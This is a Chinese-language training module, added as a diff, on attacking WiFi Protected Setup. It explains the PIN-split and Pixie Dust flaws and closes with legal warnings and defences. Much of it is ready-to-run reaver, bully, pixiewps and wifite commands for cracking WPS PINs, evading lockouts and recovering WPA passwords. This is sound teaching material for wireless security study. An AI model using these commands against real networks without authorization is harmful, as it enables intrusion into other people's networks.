@@ -1,0 +1,631 @@
+================================================================================
+  模块05：WPS攻击
+  学习目标：理解WPS协议漏洞、掌握Pixie Dust攻击和PIN暴力破解
+  所需工具：wash, reaver, bully, pixiewps, wifite
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第一部分：WPS协议漏洞原理
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1.1 什么是WPS？
+
+  WPS(WiFi Protected Setup)是2007年WiFi联盟推出的便捷连接标准。
+  目标：让非技术用户也能轻松安全地连接WiFi网络。
+
+  WPS支持四种认证方式：
+
+  1. PIN方式 (最常用，也是主要攻击目标)
+     - 用户在客户端输入AP上印的8位PIN码
+     - PIN码通常印在路由器底部标签上
+     - 这是强制要求支持的WPS方式
+
+  2. PBC方式 (Push Button Configuration)
+     - 用户在AP上按实体按钮+客户端按虚拟按钮
+     - 安全性较高，但使用时门户大开
+
+  3. NFC方式
+     - 近距离触碰连接
+     - 物理安全性高
+
+  4. USB方式
+     - 通过USB存储设备传输配置
+     - 使用极少
+
+1.2 WPS PIN码的结构缺陷
+
+  8位PIN码的致命设计缺陷：
+
+  PIN码格式：XXXXXXXX (8位数字)
+  看似有 100,000,000 种可能，但实际上：
+
+  ┌────────────────────────────────────────────────────────┐
+  │ 前7位：真实PIN (10^7 = 10,000,000种可能)               │
+  │ 第8位：校验位 (前7位的CRC校验和)                       │
+  │                                                        │
+  │ 认证过程分两步：                                       │
+  │   M1-M4：验证前4位 (10^4 = 10,000种可能)               │
+  │   M5-M8：验证后4位 (10^3 = 1,000种可能, 第8位已知)    │
+  │                                                        │
+  │ 实际最多尝试次数 = 10,000 + 1,000 = 11,000次           │
+  │ 平均需要约 5,000 + 500 = 5,500次                       │
+  │ 在最坏情况下，约11,000次尝试即可破解                   │
+  └────────────────────────────────────────────────────────┘
+
+  对比：
+    - WPA2字典破解：需要知道密码存在于字典中
+    - WPS PIN破解：最多11,000次一定成功
+    - 如果AP支持WPS，这就是"万能钥匙"
+
+1.3 WPS EAP消息交换流程
+
+  WPS使用EAP(可扩展认证协议)进行消息交换：
+
+  M1: AP -> Client : N1(随机数), Public Key(PK_A), 设备描述
+  M2: Client -> AP : N2(随机数), Public Key(PK_S), 设备描述
+                     M2用AuthKey加密(AuthKey = HMAC(DHSharedSecret, PIN前半))
+  M3: AP -> Client : N2, 用AuthKey加密
+  M4: Client -> AP : N1, 用AuthKey加密 (PIN前半验证完成)
+
+  M5: AP -> Client : N1', 用AuthKey加密 (AuthKey基于PIN后半更新)
+  M6: Client -> AP : N2', 用AuthKey加密
+  M7: AP -> Client : N2', 用AuthKey加密 (PIN后半验证完成)
+  M8: Client -> AP : 确认消息
+
+  为什么分两步？
+    - M1-M4 验证PIN前4位 (10,000种)
+    - M5-M8 验证PIN后4位 (1,000种 + 校验位)
+    - 如果前半失败，AP立即拒绝 → 不需要试后半
+
+1.4 Pixie Dust攻击原理
+
+  Pixie Dust是较新的WPS攻击方式(2014年公开)。
+
+  核心漏洞：某些WPS实现使用了弱随机数生成器(PRNG)。
+
+  正常流程中：
+    - AP生成随机数N1 (应该是密码学安全的)
+    - 客户端生成随机数N2
+
+  脆弱实现中：
+    - N1由弱的PRNG生成 (如线性同余生成器LCG)
+    - N1可被预测或恢复
+    - 如果知道N1和N2，可以推导出DHSharedSecret
+    - 有了DHSharedSecret，可以直接计算AuthKey
+    - 无需暴力破解PIN！
+
+  受影响芯片组：
+    - Ralink / MediaTek (最常见)
+    - Broadcom BCMxxxx (部分老版本)
+    - Realtek (部分型号)
+    -某些Qualcomm Atheros设备
+
+  Pixie Dust的威力：
+    - 如果成功，几秒到几分钟内完成攻击
+    - 无需暴力尝试11,000个PIN
+    - 离线计算即可得到PIN
+
+================================================================================
+  模块05：WPS攻击 (续)
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第二部分：wash — WPS扫描工具
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+2.1 基本扫描
+
+  $ sudo wash -i wlan0mon
+
+  输出解读:
+  ┌──────────────────────────────────────────────────────────────┐
+  │ BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID        │
+  │ AA:BB:CC:DD:EE:FF  6   -45  Yes  No   Broadcom  TargetWiFi   │
+  │ 11:22:33:44:55:66  1   -60  Yes  No   Ralink    OfficeNet    │
+  │ 77:88:99:AA:BB:CC  11  -80  No   -    -         NoWPS_AP     │
+  └──────────────────────────────────────────────────────────────┘
+
+  字段说明：
+    BSSID   - AP的MAC地址
+    Ch      - 信道
+    dBm     - 信号强度
+    WPS     - Yes=支持WPS, No=不支持, Lck=已锁定
+    Lck     - WPS是否锁定(多次失败后永久/临时锁定)
+    Vendor  - 芯片厂商(用来判断Pixie Dust攻击可行性)
+    ESSID   - 网络名称
+
+2.2 高级参数
+
+  $ sudo wash -i wlan0mon -a
+  -a : 显示所有AP(包括不支持WPS的)
+
+  $ sudo wash -i wlan0mon -c 6 -a
+  -c 6 : 仅扫描信道6
+
+  $ sudo wash -i wlan0mon -s
+  -s : 静默模式
+
+  $ sudo wash -i wlan0mon -j
+  -j : JSON输出格式
+
+  $ sudo wash -i wlan0mon --ignore-fcs
+  --ignore-fcs : 忽略FCS错误(有噪声环境)
+
+  新版reaver(wash已整合到reaver-wps-fork-t6x):
+  $ sudo wash -i wlan0 --scan -a
+  (支持Pixie Dust漏洞检测)
+
+2.3 WAP锁定机制
+
+  路由器在检测到多次WPS认证失败后可能执行：
+    - 临时锁定：5分钟后恢复
+    - 永久锁定：需要重启路由器
+    - 速率限制：每分钟只允许几次尝试
+  reaver和bully可以检测并适应这些机制。
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第三部分：reaver — WPS PIN暴力破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+3.1 基本攻击
+
+  完整命令格式：
+  $ sudo reaver -i <接口> -b <BSSID> -c <信道> -vv
+
+  参数详解：
+    -i wlan0mon    : 使用监听模式接口
+    -b MAC         : 目标AP的BSSID
+    -c 6           : 目标信道
+    -vv            : 详细输出(推荐)
+    -K 1           : 启用Pixie Dust攻击(1=仅Pixie, 0=禁用)
+    -p PIN         : 指定已知PIN码
+    -S             : 使用小DH密钥提高速度
+    -N             : 不发送NACK(某些AP需要)
+    -r 5:10        : 每5秒尝试一次，失败后等10秒
+    -t 20          : 接收超时(秒)
+    -T 1           : 超时时重试次数
+    --no-nacks     : 禁用NACK
+    --dh-small     : 使用小DH密钥
+
+  示例：
+  $ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
+
+3.2 Pixie Dust攻击 (重点！)
+
+  $ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
+
+  输出示例：
+  ┌─────────────────────────────────────────────────────────────┐
+  │ [+] Switching wlan0mon to channel 6                        │
+  │ [+] Waiting for beacon from AA:BB:CC:DD:EE:FF               │
+  │ [+] Received beacon from AA:BB:CC:DD:EE:FF                  │
+  │ [+] Associated with AA:BB:CC:DD:EE:FF (ESSID: TargetWiFi)  │
+  │ [+] Starting Cracking Session.                              │
+  │ [+] Running PixieWPS attack...                              │
+  │                                                             │
+  │ [Pixie-Dust]                                                │
+  │ [Pixie-Dust]   Pixiewps:                                    │
+  │ [Pixie-Dust]    E-S1: 00:11:22:33:44:55:66:...             │
+  │ [Pixie-Dust]    E-S2: AA:BB:CC:DD:EE:FF:00:...             │
+  │ [Pixie-Dust]    PKE: 11:22:33:44:55:66:77:...              │
+  │ [Pixie-Dust]    PKR: AA:BB:CC:DD:EE:FF:11:...              │
+  │ [Pixie-Dust]    AuthKey: 22:33:44:55:66:77:88:...          │
+  │ [Pixie-Dust]    Running pixiewps...                         │
+  │ [Pixie-Dust]    PIN FOUND: 12345670                        │
+  │ [Pixie-Dust]    WPA PSK: password123                       │
+  │ [Pixie-Dust]    AP SSID: TargetWiFi                        │
+  │                                                             │
+  │ [+] Pin cracked in 15 seconds                              │
+  │ [+] WPA PSK: password123                                    │
+  │ [+] AP SSID: TargetWiFi                                     │
+  └─────────────────────────────────────────────────────────────┘
+
+  Pixie Dust成功的关键：
+    - 目标AP使用Ralink/MediaTek芯片
+    - 固件中的PRNG实现有缺陷
+    - reaver自动识别并尝试
+
+3.3 标准PIN暴力破解
+
+  如果Pixie Dust失败，回退到标准暴力：
+
+  $ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
+
+  标准流程：
+    1. reaver与AP建立WPS会话
+    2. 尝试PIN前半部分(0000到9999)
+    3. EAP M4收到正确响应 → PIN前半正确
+    4. 尝试PIN后半部分(000到999，校验位自动计算)
+    5. EAP M8收到正确响应 → PIN完全正确
+    6. AP返回WPA PSK密码
+
+  优化参数：
+    --pin=12345670    : 从指定PIN开始试(bulgarian brute)
+    --session=FILE    : 保存/恢复session(防止丢进度)
+    --no-associate    : 不主动关联(某些AP不要求)
+    --fail-wait=60    : 失败后等待60秒再继续
+    --max-attempts=N  : 限制最大尝试次数
+
+3.4 恢复已保存的会话
+
+  $ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
+    -s reaver_session_file
+
+  会话文件通常保存在：
+    /etc/reaver/<BSSID>.wpc
+    或
+    /usr/local/etc/reaver/<BSSID>.wpc
+
+  查看进度：
+  $ cat /etc/reaver/AA:BB:CC:DD:EE:FF.wpc
+
+3.5 reaver故障排除
+
+  问题1: "Failed to associate with target"
+    解决: 试试 --no-associate 参数
+    原因: AP可能在WPS会话中拒绝关联请求
+
+  问题2: "WPS transaction failed (code: 0x02)"
+    解决: 增加等待时间 -t 30 -r 3:10
+    原因: AP响应太慢
+
+  问题3: "AP rate limiting detected"
+    解决: 增加 -r 30:60 等待间隔
+    原因: AP检测到攻击并限速
+
+  问题4: reaver卡死无进度
+    解决: kill并恢复session继续
+    Ctrl+C, 然后 reaver -s FILE 恢复
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第四部分：bully — WPS PIN破解(reaver替代方案)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+4.1 bully vs reaver
+
+  ┌──────────┬─────────────────────┬──────────────────────────┐
+  │ 特性     │ reaver              │ bully                    │
+  ├──────────┼─────────────────────┼──────────────────────────┤
+  │ 语言     │ C                   │ C++                      │
+  │ 速度     │ 较快                │ 更快(多线程优化)         │
+  │ Pixie    │ 支持(-K 1)          │ 支持(内置pixiewps)       │
+  │ 锁定检测 │ 基本                │ 更智能的锁定规避         │
+  │ 稳定性   │ 有些AP下不稳定      │ 在很多AP下更稳定          │
+  │ 维护状态 │ reaver-wps-fork活跃 │ 原始bully停滞，但仍有价值 │
+  │ 多目标   │ 不支持              │ 不支持                    │
+  └──────────┴─────────────────────┴──────────────────────────┘
+
+4.2 bully基本使用
+
+  命令格式：
+  $ sudo bully <接口> -b <BSSID> -c <信道> [选项]
+
+  基本攻击：
+  $ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
+
+  启用Pixie Dust：
+  $ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 --pixie
+
+  详细输出：
+  $ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3
+
+  参数详解：
+    -b <MAC>      : 目标BSSID
+    -c <channel>  : 信道
+    -v <level>    : 详细程度(1-3, 3=最详细)
+    --pixie       : 启用Pixie Dust攻击
+    --pin <PIN>   : 从指定PIN开始
+    -p <PIN>      : 使用已知PIN(确认用)
+    -d            : 调试模式
+    --lock-delay  : 锁定延迟策略
+    -L            : 强制锁定模式
+
+4.3 bully高级会话管理
+
+  保存进度(session):
+  bully自动保存进度，下次运行自动恢复
+  手动指定session文件:
+  $ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3 \
+    -s session_name
+
+  自定义尝试序列:
+  $ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 \
+    --pinlist pinlist.txt
+  (pinlist.txt: 每行一个PIN，按优先级排列)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第五部分：pixiewps — 离线PIN计算
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+5.1 pixiewps独立使用
+
+  reaver/bully调用pixiewps进行离线PIN计算，也可独立运行。
+
+  需要先从WPS EAP消息中提取以下参数：
+    PKE (Public Key Enrollee)
+    PKR (Public Key Registrar)
+    E-Hash1 (Enrollee Hash 1)
+    E-Hash2 (Enrollee Hash 2)
+    AuthKey
+    E-Nonce (Enrollee Nonce)
+
+  这些参数可以从Wireshark或reaver的调试输出中获取。
+
+  Step 1: 使用reaver获取参数
+  $ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vvv
+  观察Pixie-Dust输出中的参数值
+
+  Step 2: 手动运行pixiewps
+  $ pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> \
+    -a <AuthKey> -n <E-Nonce>
+
+  参数：
+    -e <hex>  : PKE (Enrollee Public Key)
+    -r <hex>  : PKR (Registrar Public Key)
+    -s <hex>  : E-Hash1
+    -z <hex>  : E-Hash2
+    -a <hex>  : AuthKey
+    -n <hex>  : E-Nonce
+
+  输出示例：
+  ┌─────────────────────────────────────────────────────────────┐
+  │ Pixiewps 1.4                                                │
+  │                                                             │
+  │ [!] WPS pin:    12345670                                   │
+  │                                                             │
+  │ [*] Time taken: 0.5 seconds                                │
+  └─────────────────────────────────────────────────────────────┘
+
+5.2 pixiewps高级选项
+
+  强制攻击模式：
+  $ pixiewps --pixie-dust
+  $ pixiewps --dh-small    (DH Small Keys攻击)
+
+  尝试所有可用方式：
+  $ pixiewps -e ... -r ... --force
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第六部分：wifite自动化WPS攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+6.1 wifite WPS模式
+
+  $ sudo wifite --wps
+
+  wifite的WPS攻击流程：
+    1. 自动扫描WPS设备
+    2. 按信号强度排序
+    3. 对每个目标：
+       a) 首选尝试Pixie Dust攻击
+       b) Pixie失败后回退标准PIN暴力
+       c) 智能处理WPS锁定
+    4. 破解成功后提取WPA PSK
+
+6.2 wifite高级WPS选项
+
+  $ sudo wifite --wps --pixie
+  (仅使用Pixie Dust，不进行暴力)
+
+  $ sudo wifite --wps --no-pixie
+  (禁用Pixie Dust，仅暴力PIN)
+
+  $ sudo wifite --wps --all
+  (攻击所有发现的目标)
+
+  $ sudo wifite --wps -b AA:BB:CC:DD:EE:FF -c 6
+  (指定目标)
+
+  $ sudo wifite --wps --daemon
+  (守护模式，持续运行)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第七部分：综合实践
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+实践目标：在支持WPS的AP上完成完整的WPS攻击流程
+
+══════════════════════════════════════════════════════════════════
+  实践 5-1：搭建WPS实验环境
+══════════════════════════════════════════════════════════════════
+
+  使用hostapd-wpe搭建WPS测试AP(最好的选择，支持WPS):
+
+  $ cat > /tmp/hostapd_wps.conf << 'EOF'
+  interface=wlan1
+  driver=nl80211
+  ssid=WPS_Test_Lab
+  hw_mode=g
+  channel=6
+  wpa=2
+  wpa_passphrase=test12345
+  wpa_key_mgmt=WPA-PSK
+  wpa_pairwise=CCMP
+  wps_state=2
+  ap_setup_locked=0
+  config_methods=label display push_button keypad
+  eap_server=1
+  EOF
+
+  $ sudo hostapd /tmp/hostapd_wps.conf
+
+  或使用家用路由器(TP-Link，Tenda等通常默认开启WPS)
+
+══════════════════════════════════════════════════════════════════
+  实践 5-2：WPS扫描
+══════════════════════════════════════════════════════════════════
+
+Step 1: 进入监听模式
+  终端输入：sudo airmon-ng check kill
+  终端输入：sudo airmon-ng start wlan0
+
+Step 2: 扫描WPS设备
+  终端输入：sudo wash -i wlan0mon -a
+
+Step 3: 观察结果
+  - 哪些AP支持WPS？
+  - 哪些已被锁定？
+  - 哪些使用Ralink芯片？(Pixie Dust首选目标)
+
+Step 4: 记录目标信息
+  BSSID: __________________
+  Channel: ____
+  WPS: Yes / No / Locked
+  Vendor: __________________
+  ESSID: __________________
+
+══════════════════════════════════════════════════════════════════
+  实践 5-3：reaver标准PIN暴力破解
+══════════════════════════════════════════════════════════════════
+
+Step 1: 启动reaver(终端1)
+  终端输入：sudo reaver -i wlan0mon -b <TARGET_BSSID> \
+              -c <CHANNEL> -vv
+
+Step 2: 观察进度
+  输出中观察：
+  - "Trying pin 12345670" 当前尝试的PIN
+  - "Sending EAPOL START"
+  - WPS交易状态
+  - 是否有速率限制
+
+Step 3: 处理常见状况
+  如果出现锁定：增加间隔重试
+  sudo reaver ... -r 3:10 --lock-delay=300
+
+  如果进度停滞：Ctrl+C，使用session恢复
+  sudo reaver -i wlan0mon -b <BSSID> -c <CH> \
+    -s /etc/reaver/<BSSID>.wpc -vv
+
+Step 4: 等待破解
+  - 平均时间：2-10小时(取决于AP响应速度)
+  - 如果AP锁定频繁，可能需要2-3天
+  - Pixie Dust则几秒到几分钟
+
+Step 5: 破解成功
+  输出：
+  [+] Pin cracked in XXX seconds
+  [+] WPA PSK: <密码>
+  [+] AP SSID: <网络名>
+
+══════════════════════════════════════════════════════════════════
+  实践 5-4：Pixie Dust快速攻击
+══════════════════════════════════════════════════════════════════
+
+Step 1: 先使用wash检查芯片类型
+  终端输入：sudo wash -i wlan0mon -a
+  找出Vendor为Ralink/MediaTek的目标
+
+Step 2: 启动Pixie Dust攻击
+  终端输入：sudo reaver -i wlan0mon -b <Ralink_BSSID> \
+              -c <CH> -K 1 -vv
+
+Step 3: 观察Pixie Dust输出
+  如果看到 "Running pixiewps..." 和详细的参数
+  -> Pixie Dust正尝试离线破解
+
+Step 4: 速度对比
+  Pixie Dust成功：几秒到1分钟
+  标准暴力：2到10小时
+  速度提升：100到1000倍！
+
+Step 5: 如果Pixie Dust失败
+  自动回退到标准PIN暴力
+  或手动停止并选择其他目标
+
+══════════════════════════════════════════════════════════════════
+  实践 5-5：bully替代测试
+══════════════════════════════════════════════════════════════════
+
+Step 1: 使用bully攻击同一目标
+  终端输入：sudo bully wlan0mon -b <BSSID> -c <CH> -v 3
+
+Step 2: 对比reaver和bully的表现
+  - 哪个速度更快？
+  - 哪个稳定性更好？
+  - 错误处理机制对比
+
+Step 3: bully的Pixie Dust模式
+  终端输入：sudo bully wlan0mon -b <BSSID> -c <CH> --pixie -v 3
+
+══════════════════════════════════════════════════════════════════
+  实践 5-6：wifite一键WPS攻击
+══════════════════════════════════════════════════════════════════
+
+Step 1: 启动wifite
+  终端输入：sudo wifite --wps --pixie
+
+Step 2: 选择目标
+  等待扫描完成，按数字选择WPS目标
+
+Step 3: 观察自动攻击
+  - wifite优先尝试Pixie Dust
+  - 失败后自动回退标准PIN暴力
+  - 智能处理锁定和速率限制
+
+Step 4: 查看结果
+  破解成功：wifite显示PIN和密码
+  保存文件在当前目录
+
+══════════════════════════════════════════════════════════════════
+  实践 5-7：已知PIN直接提取密码
+══════════════════════════════════════════════════════════════════
+
+  如果已知PIN码(如从路由器标签读取)：
+
+  $ sudo reaver -i wlan0mon -b <BSSID> -c <CH> \
+    -p 12345670 -vv
+
+  输出直接包含WPA PSK，确认PIN码有效
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第八部分：注意事项
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WARNING 法律警告
+  - WPS攻击仅限授权环境
+  - 未经授权破解他人WiFi属违法行为
+  - 许多国家/地区有严格的计算机犯罪法律
+
+WARNING 技术注意事项
+  - WPS攻击可能触发AP的锁定机制
+  - 如果AP永久锁定，需要物理重置路由器
+  - 对正在使用中的AP进行攻击会干扰其正常运行
+  - 部分AP在大量PIN尝试后会崩溃
+  - 速率限制策略因厂商而异(需灵活调整)
+
+WARNING 实验道德
+  - 不要攻击你没有权限的AP
+  - 测试环境建议使用自己的路由器
+  - 了解WPS漏洞是为了更好地防护自己的网络
+  - WPS攻击的研究帮助厂商改进安全性
+
+WARNING WPS防御方法
+  - 在路由器设置中禁用WPS(最有效的防御)
+  - 使用WPA3(不支持WPS)
+  - 更新路由器固件
+  - 选择不启用WPS的AP型号
+  - 监控AP日志中的异常认证尝试
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+课后练习
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. 用自己的语言解释WPS PIN码的10^4+10^3漏洞原理
+2. 用Wireshark分析一次完整的WPS EAP消息交换
+3. 对比reaver和bully在3个不同AP上的表现
+4. 研究Pixie Dust攻击的数学原理(DH密钥交换弱点)
+5. 尝试在已锁定WPS的AP上进行攻击(分析锁定机制)
+6. 计算在不同响应速度下PIN暴力破解的理论最长时间
+7. 对你的家用路由器做WPS安全评估，必要时禁用WPS
+
+================================================================================
+  模块05结束 — WPS攻击是无线安全的一个经典案例研究
+================================================================================
